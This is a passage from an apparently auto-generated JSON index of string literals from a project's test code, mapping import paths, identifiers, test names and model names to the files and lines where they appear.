    "from netra_backend.": {
      "value": "from netra_backend.",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:128",
        "scripts/align_test_imports.py:141"
      ]
    },
    "from netra_backend.app.": {
      "value": "from netra_backend.app.",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:194"
      ]
    },
    "from netra_backend.app.agents.tool_dispatcher import ToolDispatcher": {
      "value": "from netra_backend.app.agents.tool_dispatcher import ToolDispatcher",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:53"
      ]
    },
    "from netra_backend.app.llm.llm_manager import LLMManager": {
      "value": "from netra_backend.app.llm.llm_manager import LLMManager",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:49",
        "scripts/compliance/test_fixer.py:333",
        "scripts/compliance/test_fixer.py:334"
      ]
    },
    "from netra_backend.app.models.session import Session as UserSession": {
      "value": "from netra_backend.app.models.session import Session as UserSession",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:65"
      ]
    },
    "from netra_backend.app.models.user import User\n# UserPlan not yet implemented - using placeholder\nUserPlan = type('UserPlan', (), {'FREE': 'free', 'EARLY': 'early', 'MID': 'mid', 'ENTERPRISE': 'enterprise'})": {
      "value": "from netra_backend.app.models.user import User\n# UserPlan not yet implemented - using placeholder\nUserPlan = type('UserPlan', (), {'FREE': 'free', 'EARLY': 'early', 'MID': 'mid', 'ENTERPRISE': 'enterprise'})",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:72"
      ]
    },
    "from netra_backend.app.websocket.connection_manager import ConnectionManager as WebSocketConnectionManager": {
      "value": "from netra_backend.app.websocket.connection_manager import ConnectionManager as WebSocketConnectionManager",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:58"
      ]
    },
    "from netra_backend.app.websocket_core.manager import WebSocketManager as UnifiedWebSocketManager": {
      "value": "from netra_backend.app.websocket_core.manager import WebSocketManager as UnifiedWebSocketManager",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:57"
      ]
    },
    "from netra_backend.tests.conftest import": {
      "value": "from netra_backend.tests.conftest import",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:200"
      ]
    },
    "from netra_backend.tests.fixtures": {
      "value": "from netra_backend.tests.fixtures",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:198"
      ]
    },
    "from netra_backend.tests.helpers": {
      "value": "from netra_backend.tests.helpers",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:197"
      ]
    },
    "from netra_backend.tests.test_utils import setup_test_path": {
      "value": "from netra_backend.tests.test_utils import setup_test_path",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:23",
        "scripts/fix_test_utils_imports.py:80"
      ]
    },
    "from netra_backend\\.app\\.db\\.clickhouse import ClickHouseManager": {
      "value": "from netra_backend\\.app\\.db\\.clickhouse import ClickHouseManager",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:78"
      ]
    },
    "from netra_backend\\.app\\.db\\.models_agent import Agent, AgentRun": {
      "value": "from netra_backend\\.app\\.db\\.models_agent import Agent, AgentRun",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:132"
      ]
    },
    "from netra_backend\\.app\\.db\\.models_agent import AgentRun": {
      "value": "from netra_backend\\.app\\.db\\.models_agent import AgentRun",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:127"
      ]
    },
    "from netra_backend\\.app\\.models\\.conversion_event import ConversionEvent": {
      "value": "from netra_backend\\.app\\.models\\.conversion_event import ConversionEvent",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:85"
      ]
    },
    "from netra_backend\\.app\\.models\\.message import Message": {
      "value": "from netra_backend\\.app\\.models\\.message import Message",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:114"
      ]
    },
    "from netra_backend\\.app\\.models\\.session import UserSession": {
      "value": "from netra_backend\\.app\\.models\\.session import UserSession",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:64"
      ]
    },
    "from netra_backend\\.app\\.models\\.team import Team": {
      "value": "from netra_backend\\.app\\.models\\.team import Team",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:90"
      ]
    },
    "from netra_backend\\.app\\.models\\.thread import Thread": {
      "value": "from netra_backend\\.app\\.models\\.thread import Thread",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:109"
      ]
    },
    "from netra_backend\\.app\\.models\\.user import User, UserPlan": {
      "value": "from netra_backend\\.app\\.models\\.user import User, UserPlan",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:71"
      ]
    },
    "from netra_backend\\.app\\.websocket\\.connection_manager import WebSocketConnectionManager": {
      "value": "from netra_backend\\.app\\.websocket\\.connection_manager import WebSocketConnectionManager",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:57"
      ]
    },
    "from netra_backend\\.tests\\.e2e\\.data": {
      "value": "from netra_backend\\.tests\\.e2e\\.data",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:45"
      ]
    },
    "from netra_backend\\.tests\\.e2e\\.fixtures": {
      "value": "from netra_backend\\.tests\\.e2e\\.fixtures",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:44"
      ]
    },
    "from netra_backend\\.tests\\.e2e\\.helpers": {
      "value": "from netra_backend\\.tests\\.e2e\\.helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:43"
      ]
    },
    "from netra_backend\\.tests\\.e2e\\.infrastructure": {
      "value": "from netra_backend\\.tests\\.e2e\\.infrastructure",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:47"
      ]
    },
    "from netra_backend\\.tests\\.e2e\\.validators": {
      "value": "from netra_backend\\.tests\\.e2e\\.validators",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:46"
      ]
    },
    "from netra_backend\\.tests\\.integration\\.database_test_fixtures import.*": {
      "value": "from netra_backend\\.tests\\.integration\\.database_test_fixtures import.*",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:97"
      ]
    },
    "from netra_backend\\.tests\\.test_utils": {
      "value": "from netra_backend\\.tests\\.test_utils",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:50"
      ]
    },
    "from netra_backend\\.tests\\.test_utils import setup_test_path\\n": {
      "value": "from netra_backend\\.tests\\.test_utils import setup_test_path\\n",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_utils_imports.py:34"
      ]
    },
    "from netra_backend\\.tests\\.user_flow_base import.*": {
      "value": "from netra_backend\\.tests\\.user_flow_base import.*",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:102"
      ]
    },
    "from netra_backend\\.tests\\.user_journey_data import.*": {
      "value": "from netra_backend\\.tests\\.user_journey_data import.*",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:119"
      ]
    },
    "from pathlib import Path": {
      "value": "from pathlib import Path",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:178"
      ]
    },
    "from test_framework.\\1 import": {
      "value": "from test_framework.\\1 import",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:192"
      ]
    },
    "from test_framework\\.(\\w+) import": {
      "value": "from test_framework\\.(\\w+) import",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:192"
      ]
    },
    "from tests.e2e.account_deletion_flow_manager": {
      "value": "from tests.e2e.account_deletion_flow_manager",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:59"
      ]
    },
    "from tests.e2e.agent_conversation_helpers": {
      "value": "from tests.e2e.agent_conversation_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:60"
      ]
    },
    "from tests.e2e.auth_flow_testers": {
      "value": "from tests.e2e.auth_flow_testers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:56"
      ]
    },
    "from tests.e2e.config": {
      "value": "from tests.e2e.config",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:55"
      ]
    },
    "from tests.e2e.config import": {
      "value": "from tests.e2e.config import",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:93"
      ]
    },
    "from tests.e2e.data": {
      "value": "from tests.e2e.data",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:45"
      ]
    },
    "from tests.e2e.fixtures": {
      "value": "from tests.e2e.fixtures",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:40",
        "scripts/fix_e2e_test_imports.py:44"
      ]
    },
    "from tests.e2e.fixtures.core.thread_test_fixtures_core": {
      "value": "from tests.e2e.fixtures.core.thread_test_fixtures_core",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:65",
        "scripts/fix_e2e_test_imports.py:66"
      ]
    },
    "from tests.e2e.fixtures.high_volume_data": {
      "value": "from tests.e2e.fixtures.high_volume_data",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:69"
      ]
    },
    "from tests.e2e.helpers": {
      "value": "from tests.e2e.helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:39",
        "scripts/fix_e2e_test_imports.py:43"
      ]
    },
    "from tests.e2e.helpers.": {
      "value": "from tests.e2e.helpers.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:75"
      ]
    },
    "from tests.e2e.helpers.auth.oauth_journey_helpers": {
      "value": "from tests.e2e.helpers.auth.oauth_journey_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:102"
      ]
    },
    "from tests.e2e.helpers.chat_helpers": {
      "value": "from tests.e2e.helpers.chat_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:103"
      ]
    },
    "from tests.e2e.helpers.core.chat_helpers": {
      "value": "from tests.e2e.helpers.core.chat_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:103"
      ]
    },
    "from tests.e2e.helpers.core.unified_flow_helpers": {
      "value": "from tests.e2e.helpers.core.unified_flow_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:104"
      ]
    },
    "from tests.e2e.helpers.database.database_sync_helpers": {
      "value": "from tests.e2e.helpers.database.database_sync_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:106"
      ]
    },
    "from tests.e2e.helpers.database_sync_helpers": {
      "value": "from tests.e2e.helpers.database_sync_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:106"
      ]
    },
    "from tests.e2e.helpers.journey.journey_validation_helpers": {
      "value": "from tests.e2e.helpers.journey.journey_validation_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:101"
      ]
    },
    "from tests.e2e.helpers.journey.new_user_journey_helpers": {
      "value": "from tests.e2e.helpers.journey.new_user_journey_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:99"
      ]
    },
    "from tests.e2e.helpers.journey.real_service_journey_helpers": {
      "value": "from tests.e2e.helpers.journey.real_service_journey_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:100"
      ]
    },
    "from tests.e2e.helpers.journey.user_journey_helpers": {
      "value": "from tests.e2e.helpers.journey.user_journey_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:98"
      ]
    },
    "from tests.e2e.helpers.journey_validation_helpers": {
      "value": "from tests.e2e.helpers.journey_validation_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:101"
      ]
    },
    "from tests.e2e.helpers.new_user_journey_helpers": {
      "value": "from tests.e2e.helpers.new_user_journey_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:99"
      ]
    },
    "from tests.e2e.helpers.oauth_journey_helpers": {
      "value": "from tests.e2e.helpers.oauth_journey_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:102"
      ]
    },
    "from tests.e2e.helpers.real_service_journey_helpers": {
      "value": "from tests.e2e.helpers.real_service_journey_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:100"
      ]
    },
    "from tests.e2e.helpers.unified_flow_helpers": {
      "value": "from tests.e2e.helpers.unified_flow_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:104"
      ]
    },
    "from tests.e2e.helpers.user_journey_helpers": {
      "value": "from tests.e2e.helpers.user_journey_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:98"
      ]
    },
    "from tests.e2e.helpers.websocket.websocket_test_helpers": {
      "value": "from tests.e2e.helpers.websocket.websocket_test_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:105"
      ]
    },
    "from tests.e2e.helpers.websocket_test_helpers": {
      "value": "from tests.e2e.helpers.websocket_test_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:105"
      ]
    },
    "from tests.e2e.infrastructure": {
      "value": "from tests.e2e.infrastructure",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:47"
      ]
    },
    "from tests.e2e.integration.auth_flow_manager": {
      "value": "from tests.e2e.integration.auth_flow_manager",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:61"
      ]
    },
    "from tests.e2e.jwt_token_helpers": {
      "value": "from tests.e2e.jwt_token_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:53"
      ]
    },
    "from tests.e2e.jwt_token_helpers import": {
      "value": "from tests.e2e.jwt_token_helpers import",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:91"
      ]
    },
    "from tests.e2e.oauth_test_providers": {
      "value": "from tests.e2e.oauth_test_providers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:54"
      ]
    },
    "from tests.e2e.oauth_test_providers import": {
      "value": "from tests.e2e.oauth_test_providers import",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:92"
      ]
    },
    "from tests.e2e.onboarding_flow_executor": {
      "value": "from tests.e2e.onboarding_flow_executor",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:62"
      ]
    },
    "from tests.e2e.test_helpers.performance_base": {
      "value": "from tests.e2e.test_helpers.performance_base",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:72"
      ]
    },
    "from tests.e2e.validators": {
      "value": "from tests.e2e.validators",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:46"
      ]
    },
    "from tests.test_utils": {
      "value": "from tests.test_utils",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:50"
      ]
    },
    "from tests\\.config": {
      "value": "from tests\\.config",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:55"
      ]
    },
    "from tests\\.config import": {
      "value": "from tests\\.config import",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:93"
      ]
    },
    "from tests\\.e2e\\.auth_flow_testers": {
      "value": "from tests\\.e2e\\.auth_flow_testers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:56"
      ]
    },
    "from tests\\.e2e\\.high_volume_data": {
      "value": "from tests\\.e2e\\.high_volume_data",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:69"
      ]
    },
    "from tests\\.e2e\\.integration\\.account_deletion_flow_manager": {
      "value": "from tests\\.e2e\\.integration\\.account_deletion_flow_manager",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:59"
      ]
    },
    "from tests\\.e2e\\.integration\\.agent_conversation_helpers": {
      "value": "from tests\\.e2e\\.integration\\.agent_conversation_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:60"
      ]
    },
    "from tests\\.e2e\\.integration\\.auth_flow_manager": {
      "value": "from tests\\.e2e\\.integration\\.auth_flow_manager",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:61"
      ]
    },
    "from tests\\.e2e\\.integration\\.onboarding_flow_executor": {
      "value": "from tests\\.e2e\\.integration\\.onboarding_flow_executor",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:62"
      ]
    },
    "from tests\\.e2e\\.integration\\.thread_test_fixtures_core": {
      "value": "from tests\\.e2e\\.integration\\.thread_test_fixtures_core",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:65"
      ]
    },
    "from tests\\.e2e\\.performance_base": {
      "value": "from tests\\.e2e\\.performance_base",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:72"
      ]
    },
    "from tests\\.e2e\\.thread_test_fixtures_core": {
      "value": "from tests\\.e2e\\.thread_test_fixtures_core",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:66"
      ]
    },
    "from tests\\.fixtures": {
      "value": "from tests\\.fixtures",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:198"
      ]
    },
    "from tests\\.helpers": {
      "value": "from tests\\.helpers",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:197"
      ]
    },
    "from tests\\.jwt_token_helpers": {
      "value": "from tests\\.jwt_token_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:53"
      ]
    },
    "from tests\\.jwt_token_helpers import": {
      "value": "from tests\\.jwt_token_helpers import",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:91"
      ]
    },
    "from tests\\.oauth_test_providers": {
      "value": "from tests\\.oauth_test_providers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:54"
      ]
    },
    "from tests\\.oauth_test_providers import": {
      "value": "from tests\\.oauth_test_providers import",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:92"
      ]
    },
    "from tests\\.unified\\.e2e\\.fixtures": {
      "value": "from tests\\.unified\\.e2e\\.fixtures",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:40"
      ]
    },
    "from tests\\.unified\\.e2e\\.helpers": {
      "value": "from tests\\.unified\\.e2e\\.helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:39"
      ]
    },
    "from typing import": {
      "value": "from typing import",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:229"
      ]
    },
    "from typing import Dict, Any, List, Optional": {
      "value": "from typing import Dict, Any, List, Optional",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:203"
      ]
    },
    "from typing import List, Dict, Tuple, Optional, Any": {
      "value": "from typing import List, Dict, Tuple, Optional, Any",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:230"
      ]
    },
    "from unittest.mock import": {
      "value": "from unittest.mock import",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:69",
        "scripts/automated_test_fix_loop.py:78",
        "scripts/fix_test_import_errors.py:235",
        "scripts/simple_test_fix_loop.py:42",
        "scripts/simple_test_fix_loop.py:45"
      ]
    },
    "from unittest.mock import AsyncMock, MagicMock, Mock, patch": {
      "value": "from unittest.mock import AsyncMock, MagicMock, Mock, patch",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:24",
        "scripts/simple_test_fix_loop.py:46"
      ]
    },
    "from unittest.mock import Mock, MagicMock, patch": {
      "value": "from unittest.mock import Mock, MagicMock, patch",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:236"
      ]
    },
    "from unittest\\.mock import.*MagicMock.*MagicMock": {
      "value": "from unittest\\.mock import.*MagicMock.*MagicMock",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:23"
      ]
    },
    "frontend": {
      "value": "frontend",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:33",
        "scripts/align_test_imports.py:33",
        "scripts/auto_fix_test_violations.py:94",
        "scripts/autonomous_review/test_reviewer.py:188",
        "scripts/business_value_test_index.py:193",
        "scripts/business_value_test_index.py:402",
        "scripts/business_value_test_index.py:403",
        "scripts/business_value_test_index.py:561",
        "scripts/check_test_compliance.py:200",
        "scripts/check_test_compliance.py:203"
      ]
    },
    "frontend/__tests__/system/startup.test.tsx": {
      "value": "frontend/__tests__/system/startup.test.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:113"
      ]
    },
    "frontend/components/chat": {
      "value": "frontend/components/chat",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:25",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:23"
      ]
    },
    "frontend/tests": {
      "value": "frontend/tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:63"
      ]
    },
    "frontend/tests/conftest.py": {
      "value": "frontend/tests/conftest.py",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:17"
      ]
    },
    "frontend_coverage": {
      "value": "frontend_coverage",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:135"
      ]
    },
    "frontend_url": {
      "value": "frontend_url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:105"
      ]
    },
    "full": {
      "value": "full",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:208"
      ]
    },
    "full_": {
      "value": "full_",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:197"
      ]
    },
    "full_name": {
      "value": "full_name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:39"
      ]
    },
    "full_path": {
      "value": "full_path",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:134"
      ]
    },
    "function": {
      "value": "function",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:58",
        "scripts/check_test_compliance.py:177",
        "scripts/comprehensive_test_fixer.py:215",
        "scripts/comprehensive_test_fixer.py:401"
      ]
    },
    "function\\s+mock\\w*\\s*\\(": {
      "value": "function\\s+mock\\w*\\s*\\(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:63"
      ]
    },
    "function_name": {
      "value": "function_name",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:488"
      ]
    },
    "function_refactors": {
      "value": "function_refactors",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:206",
        "scripts/compliance/real_test_linter.py:209",
        "scripts/compliance/real_test_linter.py:211",
        "scripts/compliance/real_test_linter.py:212",
        "scripts/compliance/test_fixer.py:351",
        "scripts/compliance/test_fixer.py:365"
      ]
    },
    "function_size": {
      "value": "function_size",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:234",
        "scripts/auto_fix_test_violations.py:246",
        "scripts/auto_fix_test_violations.py:271",
        "scripts/auto_fix_test_violations.py:291",
        "scripts/auto_fix_test_violations.py:304",
        "scripts/auto_fix_test_violations.py:810",
        "scripts/compliance/project_test_validator.py:250",
        "scripts/compliance/real_test_linter.py:174",
        "scripts/compliance/real_test_requirements_enforcer.py:328",
        "scripts/compliance/real_test_requirements_enforcer.py:516"
      ]
    },
    "function_to_fixture": {
      "value": "function_to_fixture",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:330",
        "scripts/compliance/test_refactor_helper.py:346"
      ]
    },
    "function_to_function": {
      "value": "function_to_function",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:329",
        "scripts/compliance/test_refactor_helper.py:339",
        "scripts/compliance/test_refactor_helper.py:647"
      ]
    },
    "functionality tests.\n\"\"\"\n\nimport pytest\nimport asyncio\nfrom typing import Dict, List, Any, Optional": {
      "value": "functionality tests.\n\"\"\"\n\nimport pytest\nimport asyncio\nfrom typing import Dict, List, Any, Optional",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:208"
      ]
    },
    "functions": {
      "value": "functions",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:283",
        "scripts/autonomous_review/test_generator.py:57",
        "scripts/autonomous_review/test_reviewer.py:98",
        "scripts/autonomous_review/test_reviewer.py:98",
        "scripts/compliance/demo_test_size_enforcement.py:89",
        "scripts/compliance/test_refactor_helper.py:101",
        "scripts/compliance/test_refactor_helper.py:424",
        "scripts/compliance/test_refactor_helper.py:434",
        "scripts/compliance/test_refactor_helper.py:464",
        "scripts/compliance/test_refactor_helper.py:474"
      ]
    },
    "functions)": {
      "value": "functions)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:94"
      ]
    },
    "functions_exceeding_limit": {
      "value": "functions_exceeding_limit",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:81",
        "scripts/compliance/test_size_validator.py:106",
        "scripts/compliance/test_size_validator.py:422",
        "scripts/compliance/test_size_validator.py:461"
      ]
    },
    "functions_optimized": {
      "value": "functions_optimized",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:619",
        "scripts/auto_fix_test_sizes.py:670",
        "scripts/auto_fix_test_sizes.py:695",
        "scripts/auto_fix_test_sizes.py:708",
        "scripts/auto_fix_test_sizes.py:750"
      ]
    },
    "functions_over_8": {
      "value": "functions_over_8",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:91",
        "scripts/check_test_compliance.py:117",
        "scripts/check_test_compliance.py:134",
        "scripts/check_test_compliance.py:148",
        "scripts/check_test_compliance.py:172",
        "scripts/check_test_compliance.py:173",
        "scripts/check_test_compliance.py:174",
        "scripts/check_test_compliance.py:178",
        "scripts/check_test_compliance.py:179"
      ]
    },
    "functions_to_implement.txt": {
      "value": "functions_to_implement.txt",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:207",
        "scripts/fix_test_batch.py:390"
      ]
    },
    "gamma": {
      "value": "gamma",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:132",
        "netra_backend/app/services/realistic_test_data/models.py:53"
      ]
    },
    "gc_count": {
      "value": "gc_count",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:148"
      ]
    },
    "gcloud secrets versions add postgres-db-staging --data-file=<new_db_name>": {
      "value": "gcloud secrets versions add postgres-db-staging --data-file=<new_db_name>",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:125"
      ]
    },
    "gemini": {
      "value": "gemini",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:40"
      ]
    },
    "gemini-1.5-flash": {
      "value": "gemini-1.5-flash",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:36"
      ]
    },
    "gemini-2.5-flash": {
      "value": "gemini-2.5-flash",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:189"
      ]
    },
    "gemini-2.5-pro": {
      "value": "gemini-2.5-pro",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:37"
      ]
    },
    "gemini-api-key": {
      "value": "gemini-api-key",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:143"
      ]
    },
    "gemini-pro": {
      "value": "gemini-pro",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:61"
      ]
    },
    "generated_at": {
      "value": "generated_at",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:618"
      ]
    },
    "generated_files": {
      "value": "generated_files",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:590",
        "scripts/compliance/test_refactor_helper.py:601"
      ]
    },
    "get": {
      "value": "get",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:279",
        "auth_service/tests/test_database_authentication_failures.py:56",
        "auth_service/tests/test_database_authentication_failures.py:93",
        "auth_service/tests/test_database_authentication_failures.py:187",
        "auth_service/tests/test_database_authentication_failures.py:299",
        "auth_service/tests/test_database_connection_validation.py:309",
        "auth_service/tests/test_database_connection_validation.py:391",
        "auth_service/tests/test_staging_database_credentials.py:50",
        "auth_service/tests/test_staging_database_credentials.py:93",
        "auth_service/tests/test_staging_database_credentials.py:137"
      ]
    },
    "getConnectionQuality categorizes latency correctly": {
      "value": "getConnectionQuality categorizes latency correctly",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:43"
      ]
    },
    "getConnectionState converts WebSocket status correctly": {
      "value": "getConnectionState converts WebSocket status correctly",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:13"
      ]
    },
    "getStatusInfo returns correct display info": {
      "value": "getStatusInfo returns correct display info",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:21"
      ]
    },
    "get_all": {
      "value": "get_all",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:80"
      ]
    },
    "get_auth_database_url_async": {
      "value": "get_auth_database_url_async",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:30",
